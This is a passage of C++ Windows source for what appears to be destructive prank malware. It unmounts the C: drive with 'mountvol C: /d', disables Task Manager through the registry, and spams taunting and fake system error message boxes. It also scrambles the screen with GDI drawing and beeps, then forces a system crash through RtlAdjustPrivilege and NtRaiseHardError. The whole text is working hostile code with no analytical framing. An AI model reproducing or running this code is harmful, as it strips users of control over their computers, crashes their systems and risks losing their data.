

    //eject C:
     system("mountvol C: /d");

    DWORD dwVal = 1;

    HKEY hKey;

    //Disable TaskMGR
    RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
    RegCloseKey(hKey);

    //std::thread p1(monitor);
    //std::thread p2(monitor);

    Sleep(10000);

    DWORD dwID2 = 0;
    MSGBOXPARAMS msg2 = { 0 };
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = L"Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = L"Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, 0, &dwID2);

    DWORD dwID1 = 0;
    MSGBOXPARAMS msg1 = { 0 };
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = L"Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = L"Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, 0, &dwID1);

    //memz final payload effect but random
    for (int i = 1; i < 50; i++) {

        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = { 0 };
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = L"bet you regret that now huh";
        msg.lpszCaption = L"ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);


        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
        Sleep(300 - (4 * i));
        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 34);
        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

        Beep(rand() % 30000, rand() % 1000);

    }

    //i have no idea what this does
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    int w = rect.right - rect.left;
    int h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    HDC hdc = GetDC(0);
    INT sw = GetSystemMetrics(0);
    INT sh = GetSystemMetrics(1);
    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    for (int index = 0; index < 100; index++) {
        BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
        BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, PATINVERT);
    }

    HDC hdc2 = GetDC(HWND_DESKTOP);
    int sw2 = GetSystemMetrics(SM_CXSCREEN);
    int sh2 = GetSystemMetrics(SM_CYSCREEN);


   

    //random pixels all over the place
    for (int i = 1; i < 100; i++) {
        CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
        Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
        Sleep(50);
    }

    DWORD dwID = 0;
    MSGBOXPARAMS msg5 = { 0 };
    msg5.cbSize = sizeof(MSGBOXPARAMS);
    msg5.hwndOwner = NULL;
    msg5.hInstance = GetModuleHandle(NULL);
    msg5.lpszText = L"that was only round 1, have a little braek";
    msg5.lpszCaption = L"get ready";
    msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, 0, &dwID);

    Sleep(10000);

    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);

    HDC hdc3 = GetDC(HWND_DESKTOP);
    int sw1 = GetSystemMetrics(SM_CXSCREEN), sh1 = GetSystemMetrics(SM_CYSCREEN);

    for (int i = 0; i < 50; i++)
    {
        int y = rand() % sh1, h = sh1 - rand() % sh1 - (sh1 / 1 - 8);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
        SelectObject(hdc3, brush);
        BitBlt(hdc3, 0, y, sw1, h, hdc, rand() % 96 - 56, y, SRCCOPY);
        PatBlt(hdc3, -1, y, sw1, h, PATINVERT);
        Sleep(rand() % 1234);
    }



    HRGN hRegion;

    hRegion = CreateRectRgn(0, 0, w, h);

    for (int i = 1; i < 50; i++) {
        LineTo(desk, rand() % w, rand() % h);
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        InvertRgn(desk, hRegion);
        Sleep(50);
    }



    if (hNtdll != 0) { //crash system using undocumented methods
        NTSTATUS s1, s2;
        BOOLEAN b;
        ULONG r;

        TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        s1 = pfnRtlAdjustPrivilege(19, true, false, &b);

        TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
    }
    return 0;
}
